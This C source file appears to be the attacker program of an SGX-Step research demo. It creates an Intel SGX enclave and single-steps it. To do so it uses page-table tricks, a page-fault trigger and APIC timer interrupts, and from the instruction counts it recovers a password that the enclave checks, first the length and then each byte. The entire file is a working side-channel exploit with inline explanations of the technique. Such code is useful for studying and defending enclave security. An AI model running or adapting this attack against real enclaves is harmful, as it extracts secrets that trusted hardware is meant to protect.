#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <unistd.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/cpu.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/config.h"
#include "libsgxstep/cache.h"
#include "jsh-colors.h"
#include <sys/mman.h>

#define MAX_LEN            15
#define DO_TIMER_STEP      1
#define DEBUG              0
#define DBG_ENCL           1
#if DO_TIMER_STEP
    #define ANIMATION_DELAY    5000
#else
    #define ANIMATION_DELAY    5000
#endif

/*
 * NOTE: set DO_TIMER_STEP=0 to _simulate_ a single-stepping attack through the
 * x86 hardware trap flag (RFLAGS.TF). Use for demonstration/debugging purposes
 * only, as this does _not_ work for SGX debug enclaves(!)
 */
#if !DO_TIMER_STEP
    #warning "Using simulated stepping through HW trap flag; will not work for production enclaves!"
#endif

sgx_enclave_id_t eid = 0;
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
void *code_adrs, *trigger_adrs;

/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    #if !DO_TIMER_STEP
        DISABLE_TF;
    #endif

    #if DEBUG
        uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
        info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
    #endif
    irq_cnt++;

    if (do_irq && (irq_cnt > NUM_RUNS*10000))
    {
        info("excessive interrupt rate detected (try adjusting timer interval " \
             "to avoid getting stuck in zero-stepping); aborting...");
        do_irq = 0;
        exit(1);
    }

    if (ACCESSED(*pte_encl) && ACCESSED(*pte_trigger))
    {
        trigger_cnt++;
    }
    if (trigger_cnt >= 3)
    {
        do_irq = 0;
    }

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     *
     * Clearing the PTE "accessed" bit forces the CPU to take a ucode-assisted
     * page-table walk for the first instruction following ERESUME, which
     * causes that instruction to be much longer. We additionally flush this
     * PTE from the cache to further delay the page-table walk and increase the
     * landing space for the timer interrupt.
     */
    if (do_irq && ACCESSED(*pte_encl)) step_cnt++;
    *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
    flush(pte_encl);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
    if (do_irq)
    {
        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
        flush(pmd_encl);
#if DO_TIMER_STEP
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
#endif
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        ASSERT(fault_cnt++ < 10);

        #if DEBUG
            info("Caught page fault (base address=%p)", si->si_addr);
        #endif
    
        if (si->si_addr == trigger_adrs)
        {
            #if DEBUG
                info("Restoring trigger access rights..");
            #endif
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
            do_irq = 1;

            #if !DO_TIMER_STEP
                sgx_step_do_trap = 1;
            #endif
        }
        else
        {
            info("Unknown #PF address!");
        }
    
        break;

    #if !DO_TIMER_STEP
      case SIGTRAP:
        #if DEBUG
            //info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        #endif

        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;
    #endif

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

/* ================== ATTACKER INIT/SETUP ================= */

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    //print_system_settings();

    register_enclave_info();
    print_enclave_info();
    register_signal_handler( SIGSEGV );
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    code_adrs = get_symbol_offset("my_memcmp") + get_enclave_base();
    trigger_adrs = get_symbol_offset("trigger_page") + get_enclave_base();
    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);

    ASSERT( pte_encl    = remap_page_table_level( code_adrs, PTE) );
    ASSERT( PRESENT(*pte_encl) );
    *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
    info("enclave code at %p with PTE", code_adrs);
    print_pte_adrs( code_adrs );

    ASSERT( pte_trigger = remap_page_table_level( trigger_adrs, PTE) );
    ASSERT( PRESENT(*pte_trigger) );
    *pte_trigger = MARK_NOT_ACCESSED(*pte_trigger);
    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
    info("enclave trigger at %p with PTE", trigger_adrs);
    print_pte_adrs( trigger_adrs );

    ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
    ASSERT( PRESENT(*pmd_encl) );
}

/* ================== ATTACKER MAIN ================= */

/* Untrusted main function to create/enter the trusted enclave. */
int main( int argc, char **argv )
{
    sgx_launch_token_t token = {0};
    int apic_fd, pwd_success = 0, updated = 0, i, pwd_len;
    char *pwd = malloc(MAX_LEN);
    idt_t idt = {0};
    int step_cnt_prev = 0;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/DBG_ENCL,
                                    &token, &updated, &eid, NULL ) );

    /* 0. dry run */
    SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

    /* 1. Setup attack execution environment. */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

#if DO_TIMER_STEP
    info_event("Establishing user-space APIC/IDT mappings");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    __ss_irq_fired = 0;
    apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
    while (!__ss_irq_fired);
    info("APIC timer IRQ handler seems to be working");
#else
    register_signal_handler( SIGTRAP );
    set_debug_optin();
#endif

    /* 2. Single-step enclaved execution. */
    info_event("recovering password length");
    for (pwd_len = 0; pwd_len < MAX_LEN; pwd_len++)
    {
        for (int j = 0; j < pwd_len; j++) pwd[j] = '*';
        pwd[pwd_len] = '\0';
        do_irq = 0; trigger_cnt = 0, irq_cnt = 0, step_cnt = 0, fault_cnt = 0;
        sgx_step_do_trap = 0;
        ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
        SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

        #if DEBUG
            printf("[attacker] steps=%d; guess='%s'\n", step_cnt, pwd);
        #else
            printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG, step_cnt, pwd);
            fflush(stdout);
            for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
        #endif

        if (pwd_len > 0 && step_cnt > step_cnt_prev) break;
        step_cnt_prev = step_cnt;
    }
    ASSERT( pwd_len < MAX_LEN );
    printf(COLOR_RESET_ALL "\n[attacker] found pwd len = %d\n", pwd_len);

#if 1
    info_event("recovering password bytes");
    
    for (i=0; i < pwd_len; i++)
    {
        step_cnt_prev = 100;
        for (int j='A'-1; j<'Z'; j++)
        {
            pwd[i] = j;
            do_irq = 0; trigger_cnt = 0, irq_cnt = 0, step_cnt = 0, fault_cnt = 0;
            sgx_step_do_trap = 0;
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
            SGX_ASSERT( memcmp_pwd(eid, &pwd_success, pwd) );

            #if DEBUG
                printf("[attacker] steps=%d; guess='%s --> %s'\n", step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL");
            #else
                printf("\r" BLUE_FG COLOR_BOLD "[attacker] steps=%d; " YELLOW_BG "guess='%s'" RESET_BG " --> %s",
                        step_cnt, pwd, pwd_success ? "SUCCESS" : "FAIL   ");
                fflush(stdout);
                for (volatile long int j=0; j < ANIMATION_DELAY; j++); /* delay for animation */
            #endif

            if (pwd_success || (j >= 'A' && step_cnt > step_cnt_prev)) break;
            step_cnt_prev = step_cnt;
        }
    }
    printf(COLOR_RESET_ALL "\n\n");
#endif

    info("all done; counted %d/%d IRQs (AEP/IDT)", irq_cnt, __ss_irq_count);
    return 0;
}
